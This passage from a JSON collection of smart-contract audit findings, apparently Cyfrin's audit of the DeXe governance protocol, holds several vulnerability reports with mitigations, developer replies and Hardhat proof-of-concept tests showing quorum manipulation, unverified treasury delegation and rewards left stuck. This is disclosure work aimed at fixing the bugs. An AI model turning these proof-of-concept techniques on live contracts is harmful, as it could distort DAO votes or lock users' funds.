      "impact": "MEDIUM",
      "content": "**Description:** Use `ERC721::_safeMint()` instead of `ERC721::_mint()` in `AbstractERC721Multiplier::_mint()` [L89](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/multipliers/AbstractERC721Multiplier.sol#L89) & `ERC721Expert::mint()` [L30](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Expert.sol#L30).\n\n**Impact:** Using `ERC721::_mint()` can mint ERC721 tokens to addresses which don't support ERC721 tokens, while `ERC721::_safeMint()` ensures that ERC721 tokens are only minted to addresses which support them. OpenZeppelin [discourages](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/token/ERC721/ERC721.sol#L275) the use of `_mint()`.\n\nIf the project team believes the usage of `_mint()` is correct in this case, a reason why should be documented in the code where it occurs.\n\n**Recommended Mitigation:** Use `_safeMint()` instead of `_mint()` for ERC721.\n\n**Dexe:**\nWe won’t use `_safeMint()` because:\n\n1. It opens up potential re-entrancy vulnerabilities,\n2. The decision over mints is decided by DAOs. We won’t limit them in terms of who to send tokens to.",
      "summary": "\nThis bug report is about the use of `ERC721::_safeMint()` instead of `ERC721::_mint()` in `AbstractERC721Multiplier::_mint()` and `ERC721Expert::mint()`. `ERC721::_mint()` can mint ERC721 tokens to addresses which don't support ERC721 tokens, while `ERC721::_safeMint()` ensures that ERC721 tokens are only minted to addresses which support them. OpenZeppelin discourages the use of `_mint()`. The recommended mitigation is to use `_safeMint()` instead of `_mint()` for ERC721.\n\nHowever, the Dexe team won't use `_safeMint()` because it opens up potential re-entrancy vulnerabilities and they don't want to limit the decision over mints to be decided by DAOs in terms of who to send tokens to. If the project team believes the usage of `_mint()` is correct in this case, they should document a reason why in the code where it occurs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27305",
      "title": "Using `block.timestamp` for swap deadline offers no protection",
      "impact": "MEDIUM",
      "content": "**Description:** `block.timestamp` is used as the deadline for swaps in `PriceFeed::exchangeFromExact()` [L106](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/core/PriceFeed.sol#L106) & `PriceFeed::exchangeToExact()` [L151](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/core/PriceFeed.sol#L151).\n\nIn the PoS model, proposers know well in advance if they will propose one or consecutive blocks ahead of time. In such a scenario, a malicious validator can hold back the transaction and execute it at a more favourable block number.\n\n**Impact:** This offers no protection as `block.timestamp` will have the value of whichever block the txn is inserted into, hence the txn can be held indefinitely by malicious validators.\n\n**Recommended Mitigation:** Consider allowing function caller to specify swap deadline input parameter.\n\n**Dexe:**\nFunctionality removed.",
      "summary": "\nThis bug report is about the use of `block.timestamp` as the deadline for swaps in `PriceFeed::exchangeFromExact()` and `PriceFeed::exchangeToExact()`. In a Proof-of-Stake (PoS) model, malicious validators can hold back the transaction and execute it at a more favourable block number, as `block.timestamp` will have the value of whichever block the transaction is inserted into. This offers no protection. The recommended mitigation for this issue is to consider allowing function callers to specify a swap deadline input parameter. The Dexe team has removed the functionality.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27304",
      "title": "Static `GovUserKeeper::_nftInfo.totalPowerInTokens` used in quorum denominator can incorrectly make it impossible to reach quorum",
      "impact": "HIGH",
      "content": "**Description:** Consider the following factors:\n\n1) `GovPoolVote::_quorumReached()` [uses](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolVote.sol#L337) `GovUserKeeper::getTotalVoteWeight()` as the denominator for determining whether quorum has been reached.\n\n2) `GovUserKeeper::getTotalVoteWeight()` returns the current total supply of ERC20 tokens [plus](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L573) `_nftInfo.totalPowerInTokens`\n\n3) `_nftInfo.totalPowerInTokens` which is [only set once at initialization](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L690-L694) represents the total voting power of the nft contract in erc20 tokens.\n\nWhen voting using `ERC721Power` nfts where nft power can decrease to zero if nfts don't have the required collateral deposited, this can result in a state where `ERC721Power.totalPower() == 0` but `GovUserKeeper::_nftInfo.totalPowerInTokens > 0`.\n\nHence the voting power of the ERC20 voting tokens will be incorrectly diluted by the nft's initial voting power `GovUserKeeper::_nftInfo.totalPowerInTokens`, even though the nfts have lost all voting power.\n\nThis can result in a state where quorum is impossible to reach.\n\n**Impact:** Quorum can be impossible to reach.\n\n**Proof of Concept:** Firstly comment out GovUserKeeper [L677](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L677) & [L690](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L690) to allow quickly in-place changing of the voting & nft contracts.\n\nAdd PoC to `GovPool.test.js` under section `describe(\"getProposalState()\", () => {`:\n```javascript\n      it(\"audit static GovUserKeeper::_nftInfo.totalPowerInTokens in quorum denominator can incorrectly make it impossible to reach quorum\", async () => {\n        // time when nft power calculation starts\n        let powerNftCalcStartTime = (await getCurrentBlockTime()) + 200;\n\n        // required so we can call .toFixed() on BN returned outputs\n        ERC721Power.numberFormat = \"BigNumber\";\n\n        // ERC721Power.totalPower should be zero as no nfts yet created\n        assert.equal((await nftPower.totalPower()).toFixed(), \"0\");\n\n        // so proposal doesn't need to go to validators\n        await changeInternalSettings(false);\n\n        // set nftPower as the voting nft\n        // need to comment out check preventing updating existing\n        // nft address in GovUserKeeper::setERC721Address()\n        await impersonate(govPool.address);\n        await userKeeper.setERC721Address(nftPower.address, wei(\"190000000000000000000\"), 1, { from: govPool.address });\n\n        // create a new VOTER account and mint them the only power nft\n        let VOTER = await accounts(10);\n        await nftPower.safeMint(VOTER, 1);\n\n        // switch to using a new ERC20 token for voting; lets us\n        // control exactly who has what voting power without worrying about\n        // what previous setups have done\n        // requires commenting out require statement in GovUserKeeper::setERC20Address()\n        let newVotingToken = await ERC20Mock.new(\"NEWV\", \"NEWV\", 18);\n        await impersonate(govPool.address);\n        await userKeeper.setERC20Address(newVotingToken.address, { from: govPool.address });\n\n        // mint VOTER some tokens that when combined with their NFT are enough\n        // to reach quorum\n        let voterTokens = wei(\"190000000000000000000\");\n        await newVotingToken.mint(VOTER, voterTokens);\n        await newVotingToken.approve(userKeeper.address, voterTokens, { from: VOTER });\n        await nftPower.approve(userKeeper.address, \"1\", { from: VOTER });\n\n        // VOTER deposits their tokens & nft to have voting power\n        await govPool.deposit(VOTER, voterTokens, [1], { from: VOTER });\n\n        // advance to the approximate time when nft power calculation starts\n        await setTime(powerNftCalcStartTime);\n\n        // verify nft power after power calculation has started\n        let nftTotalPowerBefore = \"900000000000000000000000000\";\n        assert.equal((await nftPower.totalPower()).toFixed(), nftTotalPowerBefore);\n\n        // create a proposal which takes a snapshot of the current nft power\n        let proposal1Id = 2;\n\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], false)]]\n        );\n\n        // vote on first proposal\n        await govPool.vote(proposal1Id, true, voterTokens, [1], { from: VOTER });\n\n        // advance time to allow proposal state change\n        await setTime((await getCurrentBlockTime()) + 10);\n\n        // verify that proposal has reached quorum;\n        // VOTER's tokens & nft was enough to reach quorum\n        assert.equal(await govPool.getProposalState(proposal1Id), ProposalState.SucceededFor);\n\n        // advance time; since VOTER's nft doesn't have collateral deposited\n        // its power will decrement to zero\n        await setTime((await getCurrentBlockTime()) + 10000);\n\n        // call ERC721::recalculateNftPower() for the nft, this will update\n        // ERC721Power.totalPower with the actual current total power\n        await nftPower.recalculateNftPower(\"1\");\n\n        // verify that the true totalPower has decremented to zero as the nft\n        // lost all its power since it didn't have collateral deposited\n        assert.equal((await nftPower.totalPower()).toFixed(), \"0\");\n\n        // create 2nd proposal which takes a snapshot of the current nft power\n        let proposal2Id = 3;\n\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], false)]]\n        );\n\n        // vote on second proposal\n        await govPool.vote(proposal2Id, true, voterTokens, [1], { from: VOTER });\n\n        // advance time to allow proposal state change\n        await setTime((await getCurrentBlockTime()) + 10);\n\n        // verify that proposal has not reached quorum;\n        // even though VOTER owns 100% of the supply of the ERC20 voting token,\n        // it is now impossible to reach quorum since the power of VOTER's\n        // ERC20 tokens is being incorrectly diluted through the quorum calculation\n        // denominator assuming the nfts still have voting power.\n        //\n        // this is incorrect as the nft has lost all power. The root cause\n        // is GovUserKeeper::_nftInfo.totalPowerInTokens which is static\n        // but used in the denominator when calculating whether\n        // quorum is reached\n        assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.Voting);\n      });\n```\n\nRun with: `npx hardhat test --grep \"audit static GovUserKeeper::_nftInfo.totalPowerInTokens in quorum denominator\"`\n\n**Recommended Mitigation:** Change `GovUserKeeper::getTotalVoteWeight` [L573](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L573) to use 0 instead of `_nftInfo.totalPowerInTokens` if `IERC721Power(nftAddress).totalPower() == 0`.\n\nConsider whether this should be refactored such that the suggested `totalPower() == 0` check should not be done against the current `totalPower`, but against the `totalPower` saved when the proposal's nft snapshot was created which is stored in `GovUserKeeper::nftSnapshot[proposalSnapshotId]`.\n\n**Dexe:**\nFixed in [PR172](https://github.com/dexe-network/DeXe-Protocol/commit/b2b30da3204acd16da6fa61e79703ac0b6271815), [PR173](https://github.com/dexe-network/DeXe-Protocol/commit/15edac2ba207a915bd537684cd7644831ec2c887) & commit [7a0876b](https://github.com/dexe-network/DeXe-Protocol/commit/7a0876b3c6f832d03b2d45760a85b42d23a21ce7).\n\n**Cyrin:**\nDuring the mitigations Dexe has performed significant refactoring on the power nfts; what was previously 1 contract has become 3, and the interaction between the power nft voting contracts and `GovPool` & `GovUserKeeper` has been significantly changed.\n\nIn the new implementation:\n* when users use power nfts to [vote personally, this uses the current power](https://github.com/dexe-network/DeXe-Protocol/blob/440b8b3534d58d16df781b402503be5a64d5d576/contracts/libs/gov/gov-user-keeper/GovUserKeeperView.sol#L185) of the power nft\n* when users delegate power nfts and [have the delegatee vote, this caches the minimum power](https://github.com/dexe-network/DeXe-Protocol/blob/440b8b3534d58d16df781b402503be5a64d5d576/contracts/gov/user-keeper/GovUserKeeper.sol#L266) of the power nft\n* when the power nft [`totalRawPower` is calculated, this always uses the current power](https://github.com/dexe-network/DeXe-Protocol/blob/440b8b3534d58d16df781b402503be5a64d5d576/contracts/gov/ERC721/powers/AbstractERC721Power.sol#L212) of power nfts\n* the [quorum denominator always uses `totalRawPower`](https://github.com/dexe-network/DeXe-Protocol/blob/440b8b3534d58d16df781b402503be5a64d5d576/contracts/gov/user-keeper/GovUserKeeper.sol#L619) which is calculated from the current power\n\nThe effect of this is that:\n* users are highly penalized for delegating power nfts compared to using them to personally vote\n* the quorum denominator is always based on the current nft power so will be over-inflated if users are delegating their nfts and receiving only the minimum voting power\n\nHere is a PoC for `GovPool.test.js` that illustrates this scenario:\n```javascript\n       it(\"audit actual power nft voting power doesn't match total nft voting power\", async () => {\n          let powerNftCalcStartTime = (await getCurrentBlockTime()) + 200;\n\n          // required so we can call .toFixed() on BN returned outputs\n          ERC721RawPower.numberFormat = \"BigNumber\";\n\n          // ERC721RawPower::totalPower should be zero as no nfts yet created\n          assert.equal((await nftPower.totalPower()).toFixed(), \"0\");\n\n          // set nftPower as the voting nft\n          // need to comment out check preventing updating existing\n          // nft address in GovUserKeeper::setERC721Address()\n          await impersonate(govPool.address);\n          await userKeeper.setERC721Address(nftPower.address, wei(\"33000\"), 33, { from: govPool.address });\n\n          // create new MASTER & SLAVE accounts\n          let MASTER = await accounts(10);\n          let SLAVE  = await accounts(11);\n\n          // mint MASTER 1 power nft\n          let masterNftId = 1;\n          await nftPower.mint(MASTER, masterNftId, \"\");\n\n          // advance to the approximate time when nft power calculation starts\n          await setTime(powerNftCalcStartTime);\n\n          // verify MASTER's nft has current power > 0\n          let masterNftCurrentPowerStart = (await nftPower.getNftPower(masterNftId)).toFixed();\n          assert.equal(masterNftCurrentPowerStart, \"894960000000000000000000000\");\n          // verify MASTER's nft has minumum power = 0\n          let masterNftMinPowerStart = (await nftPower.getNftMinPower(masterNftId)).toFixed();\n          assert.equal(masterNftMinPowerStart, \"0\");\n\n          // MASTER deposits their nft then delegates it to SLAVE, another address they control\n          await nftPower.approve(userKeeper.address, masterNftId, { from: MASTER });\n          await govPool.deposit(\"0\", [masterNftId], { from: MASTER });\n          await govPool.delegate(SLAVE, \"0\", [masterNftId], { from: MASTER });\n\n          // delegation triggers power recalculation on master's nft. Delegation caches\n          // the minimum possible voting power of master's nft 0 and uses that for\n          // slaves delegated voting power. But recalculation uses the current power\n          // of Master's NFT > 0 to update the contract's total power, and this value\n          // is used in the denominator of the quorum calculation\n          assert.equal((await nftPower.totalPower()).toFixed(), \"894690000000000000000000000\");\n\n          // mint THIRD some voting tokens & deposit them\n          let thirdTokens = wei(\"1000\");\n          await token.mint(THIRD, thirdTokens);\n          await token.approve(userKeeper.address, thirdTokens, { from: THIRD });\n          await govPool.deposit(thirdTokens, [], { from: THIRD });\n\n          // create a proposal\n          let proposalId = 1;\n          await govPool.createProposal(\"\",\n            [[govPool.address, 0, getBytesDelegateTreasury(THIRD, wei(\"1\"), [])]], [], { from: THIRD });\n\n          // MASTER uses their SLAVE account to vote on the proposal; this reverts\n          // as delegation saved the minimum possible voting power of MASTER's nft 0\n          // and uses 0 as the voting power\n          await truffleAssert.reverts(\n            govPool.vote(proposalId, true, 0, [], { from: SLAVE }),\n            \"Gov: low voting power\"\n          );\n\n          // MASTER has the one & only power nft\n          // It has current power   = 894690000000000000000000000\n          // nft.Power.totalPower() = 894690000000000000000000000\n          // This value will be used in the denominator of the quorum calculation\n          // But in practice its actual voting power is 0 since the minumum\n          // possible voting power is used for voting power in delegation, causing\n          // the quorum denominator to be over-inflated\n        });\n```\n\nAlso due to the significant refactoring in this area, here is the updated PoC we used to verify the fix:\n\n```javascript\n        it(\"audit verified: nft totalPower > 0 when all nfts lost power incorrectly makes it impossible to reach quorum\", async () => {\n          // required so we can call .toFixed() on BN returned outputs\n          ERC721RawPower.numberFormat = \"BigNumber\";\n\n          // time when nft power calculation starts\n          let powerNftCalcStartTime = (await getCurrentBlockTime()) + 200;\n\n          // create a new nft power token with max power same as voting token's\n          // total supply; since we only mint 1 nft this keeps PoC simple\n          let voterTokens = wei(\"190000000000000000000\");\n\n          let newNftPower = await ERC721RawPower.new();\n          await newNftPower.__ERC721RawPower_init(\n            \"NFTPowerMock\",\n            \"NFTPM\",\n            powerNftCalcStartTime,\n            token.address,\n            toPercent(\"0.01\"),\n            voterTokens,\n            \"540\"\n          );\n\n          // ERC721Power.totalPower should be zero as no nfts yet created\n          assert.equal((await newNftPower.totalPower()).toFixed(), \"0\");\n\n          // so proposal doesn't need to go to validators\n          await changeInternalSettings(false);\n\n          // set newNftPower as the voting nft\n          // need to comment out check preventing updating existing\n          // nft address in GovUserKeeper::setERC721Address()\n          await impersonate(govPool.address);\n          // individualPower & supply params not used for power nfts\n          await userKeeper.setERC721Address(newNftPower.address, \"0\", 0, { from: govPool.address });\n\n          // create a new VOTER account and mint them the only power nft\n          let VOTER = await accounts(10);\n          let voterNftId = 1;\n          await newNftPower.mint(VOTER, voterNftId, \"\");\n\n          // switch to using a new ERC20 token for voting; lets us\n          // control exactly who has what voting power without worrying about\n          // what previous setups have done\n          // requires commenting out require statement in GovUserKeeper::setERC20Address()\n          let newVotingToken = await ERC20Mock.new(\"NEWV\", \"NEWV\", 18);\n          await impersonate(govPool.address);\n          await userKeeper.setERC20Address(newVotingToken.address, { from: govPool.address });\n\n          // mint VOTER some tokens that when combined with their NFT are enough\n          // to reach quorum\n          await newVotingToken.mint(VOTER, voterTokens);\n          await newVotingToken.approve(userKeeper.address, voterTokens, { from: VOTER });\n          await newNftPower.approve(userKeeper.address, voterNftId, { from: VOTER });\n\n          // VOTER deposits their tokens & nft to have voting power\n          await govPool.deposit(voterTokens, [voterNftId], { from: VOTER });\n\n          // advance to the approximate time when nft power calculation starts\n          await setTime(powerNftCalcStartTime);\n\n          // verify nft power after power calculation has started\n          assert.equal((await newNftPower.totalPower()).toFixed(), voterTokens);\n\n          // create a proposal\n          let proposal1Id = 2;\n\n          await govPool.createProposal(\n            \"example.com\",\n            [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], true)]],\n            [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], false)]]\n          ,{from : VOTER});\n\n          // vote on first proposal\n          await govPool.vote(proposal1Id, true, voterTokens, [voterNftId], { from: VOTER });\n\n          // advance time to allow proposal state change\n          await setTime((await getCurrentBlockTime()) + 10);\n\n          // verify that proposal has reached quorum;\n          // VOTER's tokens & nft was enough to reach quorum'\n          // since VOTER owns all the voting erc20s & power nfts\n          //\n          // fails here; proposal still in Voting state?\n          assert.equal(await govPool.getProposalState(proposal1Id), ProposalState.SucceededFor);\n\n          // advance time; since VOTER's nft doesn't have collateral deposited\n          // its power will decrement to zero\n          await setTime((await getCurrentBlockTime()) + 10000);\n\n          // create 2nd proposal\n          let proposal2Id = 3;\n\n          await govPool.createProposal(\n            \"example.com\",\n            [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], true)]],\n            [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], false)]]\n          ,{from : VOTER});\n\n          // vote on second proposal\n          await govPool.vote(proposal2Id, true, voterTokens, [voterNftId], { from: VOTER });\n\n          // advance time to allow proposal state change\n          await setTime((await getCurrentBlockTime()) + 10);\n\n          // this used to fail as the proposal would fail to reach quorum\n          // but now it works\n          assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.SucceededFor);\n        });\n```\n\n**Dexe:**\nWe are aware of this inflation thing. Unfortunately, this is probably a sacrifice we have to make. Given the business logic of power NFT, we are caught between two stools. Either loops with \"current power\" (which doesn't work for delegatees as potentially the whole supply could be delegated to a single user) or with minimal power and quorum inflation.\n\nThe second option seems to be better and much more elegant. Also it incentivises users to add collateral to their NFTs.\n\n\\clearpage",
      "summary": "\nA bug report was submitted regarding the GovPoolVote::_quorumReached() function in the DeXe-Protocol. This function uses GovUserKeeper::getTotalVoteWeight() as the denominator for determining whether quorum has been reached. The issue is that when a user is voting with ERC721Power nfts, the nft power can decrease to zero if nfts don't have the required collateral deposited. This can result in a state where quorum is impossible to reach, as the voting power of the ERC20 voting tokens will be incorrectly diluted by the nft's initial voting power, even though the nfts have lost all voting power.\n\nThe recommended mitigation is to change GovUserKeeper::getTotalVoteWeight to use 0 instead of _nftInfo.totalPowerInTokens if IERC721Power(nftAddress).totalPower() == 0. It is also recommended to consider refactoring such that the suggested totalPower() == 0 check should not be done against the current totalPower, but against the totalPower saved when the proposal's nft snapshot was created which is stored in GovUserKeeper::nftSnapshot[proposalSnapshotId].\n\nDexe fixed this issue in PR172, PR173, and commit 7a0876b3c6f832d03b2d45760a85b42d23a21ce7. During the mitigations, Dexe has performed significant refactoring on the power nfts. The interaction between the power nft voting contracts and GovPool & GovUserKeeper has been significantly changed.\n\nNow, when users use power nfts to vote personally, this uses the current power of the power nft. When users delegate power nfts and have the delegatee vote, this caches the minimum power of the power nft. When the power nft totalRawPower is calculated, this always uses the current power of power nfts. The quorum denominator always uses totalRawPower which is calculated from the current power.\n\nThe effect of this is that users are highly penalized for delegating power nfts compared to using them to personally vote, and the quorum denominator is always based on the current nft power so will be over-inflated if users are delegating their nfts and receiving only the minimum voting power.\n\nDexe is aware",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27303",
      "title": "`GovPool::delegateTreasury` does not verify transfer of tokens and NFTs to delegatee leading to potential voting manipulation",
      "impact": "HIGH",
      "content": "**Description:** `GovPool::delegateTreasury` transfers ERC20 tokens & specific nfts from DAO treasury to `govUserKeeper`. Based on this transfer, the `tokenBalance` and `nftBalance` of the delegatee is increased. This allows a delegatee to use this delegated voting power to vote in critical proposals.\n\nAs the following snippet of `GovPool::delegateTreasury` function shows, there is no verification that the tokens and nfts are actually transferred to the `govUserKeeper`. It is implicitly assumed that a successful transfer is completed and subsequently, the voting power of the delegatee is increased.\n\n```solidity\n  function delegateTreasury(\n        address delegatee,\n        uint256 amount,\n        uint256[] calldata nftIds\n    ) external override onlyThis {\n        require(amount > 0 || nftIds.length > 0, \"Gov: empty delegation\");\n        require(getExpertStatus(delegatee), \"Gov: delegatee is not an expert\");\n\n        _unlock(delegatee);\n\n        if (amount != 0) {\n            address token = _govUserKeeper.tokenAddress();\n\n  >          IERC20(token).transfer(address(_govUserKeeper), amount.from18(token.decimals())); //@audit no check if tokens are actually transferred\n\n            _govUserKeeper.delegateTokensTreasury(delegatee, amount);\n        }\n\n        if (nftIds.length != 0) {\n            IERC721 nft = IERC721(_govUserKeeper.nftAddress());\n\n            for (uint256 i; i < nftIds.length; i++) {\n  >              nft.safeTransferFrom(address(this), address(_govUserKeeper), nftIds[i]); //-n no check if nft's are actually transferred\n            }\n\n            _govUserKeeper.delegateNftsTreasury(delegatee, nftIds);\n        }\n\n        _revoteDelegated(delegatee, VoteType.TreasuryVote);\n\n        emit DelegatedTreasury(delegatee, amount, nftIds, true);\n    }\n```\n\nThis could lead to a dangerous situation where a malicious DAO treasury can increase voting power manifold while actually transferring tokens only once (or even, not transfer at all). This breaks the invariance that the total accounting balances in `govUserKeeper` contract must match the actual token balances in that contract.\n\n\n**Impact:** Since both the ERC20 and ERC721 token implementations are controlled by the DAO, and since we are dealing with upgradeable token contracts, there is a potential rug-pull vector created by the implicit transfer assumption above.\n\n\n**Recommended Mitigation:** Since DEXE starts out with a trustless assumption that does not give any special trust privileges to a DAO treasury, it is always prudent to follow the \"trust but verify\" approach when it comes to non-standard tokens, both ERC20 and ERC721. To that extent, consider adding verification of token & nft balance increase before/after token transfer.\n\n\n**Dexe:**\nAcknowledged; this finding is about tokens we have no control over. These tokens have to be corrupt in order for `safeTransferFrom` and `transfer` functions to not work. With legit tokens everything works as intended.",
      "summary": "\nA bug report has been filed with DEXE for the `GovPool::delegateTreasury` function which is used to transfer ERC20 tokens and specific nfts from the DAO treasury to the `govUserKeeper` contract. The bug is that there is no verification that the tokens and nfts are actually transferred to the `govUserKeeper`. This could lead to a dangerous situation where a malicious DAO treasury can increase voting power manifold while actually transferring tokens only once (or even, not transfer at all). This would break the invariance that the total accounting balances in `govUserKeeper` contract must match the actual token balances in that contract.\n\nThe recommended mitigation is to always follow the \"trust but verify\" approach when it comes to non-standard tokens, both ERC20 and ERC721, and to consider adding verification of token & nft balance increase before/after token transfer. DEXE has acknowledged the bug report and stated that with legit tokens, everything works as intended.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27302",
      "title": "`DistributionProposal` 'for' voter rewards diluted by 'against' voters and missing rewards permanently stuck in `DistributionProposal` contract",
      "impact": "HIGH",
      "content": "**Description:** `DistributionProposal` [only pays rewards to users who voted \"for\" the proposal](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L115-L117), not \"against\" it.\n\nBut when [calculating the reward](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L119-L123) `DistributionProposal::getPotentialReward()` the divisor is `coreRawVotesFor + coreRawVotesAgainst` which represents the total sum of all votes both \"for\" and \"against\", even though votes \"against\" are excluded from rewards.\n\nThe effect of this is that rewards to \"for\" voters are diluted by \"against\" voters, even though \"against\" voters don't qualify for the rewards. The missing rewards are permanently stuck inside the `DistributionProposal` contract unable to ever be paid out.\n\nAttempting to retrieve the rewards by creating a new `DistributionProposal` fails as the rewards are stuck inside the existing  `DistributionProposal` contract. Attempting to create a new 2nd \"rescue\" proposal `secondProposalId` using the existing `DistributionProposal` contract fails as:\n\n1) `DistributionProposal::execute()` [requires](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L58) `amount > 0` and [transfers](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L65) that amount into the contract, so it would have to be re-funded again with `newRewardAmount`\n\n2) `DistributionProposal::execute()` [sets](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L67) `proposals[secondProposalId].rewardAmount = newRewardAmount`\n\n3) `DistributionProposal::claim()` [has to be called](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L71) with `secondProposalId` which calls `DistributionProposal::getPotentialReward()` which [uses](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L120) this `newRewardAmount` for calculating the reward users will receive.\n\nSo it doesn't appear possible to rescue the unpaid amount from the first proposal using this strategy. There appears to be no mechanism to retrieve unpaid tokens from the `DistributionProposal` contract.\n\n**Impact:** In every proposal that has both \"for\" and \"against\" voters, the `DistributionProposal` rewards paid out to \"for\" voters will be less than the total reward amount held by the `DistributionProposal` contract and the missing balance will be permanently stuck inside the `DistributionProposal` contract.\n\n**Proof of Concept:** Add PoC to `DistributionProposal.test.js` under section `describe(\"claim()\", () => {`:\n```javascript\n      it(\"audit for voter rewards diluted by against voter, remaining rewards permanently stuck in DistributionProposal contract\", async () => {\n        let rewardAmount = wei(\"10\");\n        let halfRewardAmount = wei(\"5\");\n\n        // mint reward tokens to sending address\n        await token.mint(govPool.address, rewardAmount);\n\n        // use GovPool to create a proposal with 10 wei reward\n        await govPool.createProposal(\n          \"example.com\",\n          [\n            [token.address, 0, getBytesApprove(dp.address, rewardAmount)],\n            [dp.address, 0, getBytesDistributionProposal(1, token.address, rewardAmount)],\n          ],\n          [],\n          { from: SECOND }\n        );\n\n        // only 1 vote \"for\" by SECOND who should get the entire 10 wei reward\n        await govPool.vote(1, true, 0, [1], { from: SECOND });\n        // but THIRD votes \"against\", these votes are excluded from getting the reward\n        await govPool.vote(1, false, 0, [6], { from: THIRD });\n\n        // fully fund the proposal using erc20 token\n        await impersonate(govPool.address);\n        await token.approve(dp.address, rewardAmount, { from: govPool.address });\n        await dp.execute(1, token.address, rewardAmount, { from: govPool.address });\n\n        // verify SECOND has received no reward\n        assert.equal((await token.balanceOf(SECOND)).toFixed(), \"0\");\n\n        // claiming the reward releases the erc20 tokens\n        await dp.claim(SECOND, [1]);\n\n        // SECOND only receives half the total reward as the reward is diluted\n        // by the \"against\" vote, even though that vote is excluded from the reward.\n        // as a consequence only half of the reward is paid out to the \"for\" voter when\n        // they should get 100% of the reward since they were the only \"for\" voter and\n        // only \"for\" votes qualify for rewards\n        assert.equal((await token.balanceOf(SECOND)).toFixed(), halfRewardAmount);\n\n        // the remaining half of the reward is permanently stuck\n        // inside the DistributionProposal contract!\n        assert.equal((await token.balanceOf(dp.address)).toFixed(), halfRewardAmount);\n      });\n```\n\nRun with: `npx hardhat test --grep \"audit for voter rewards diluted by against voter\"`\n\n**Recommended Mitigation:** Consider one of the following options:\n\na) Change the [reward calculation divisor](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L122) to use only `coreRawVotesFor`.\n\nb) If the intentional design is to allow \"against\" voters to dilute the rewards of \"for\" voters, then implement a mechanism to refund the unpaid tokens from the `DistributionProposal` contract back to the `GovPool` contract. This could be done inside `DistributionProposal::execute()` using a process like:\n\n1) calculating 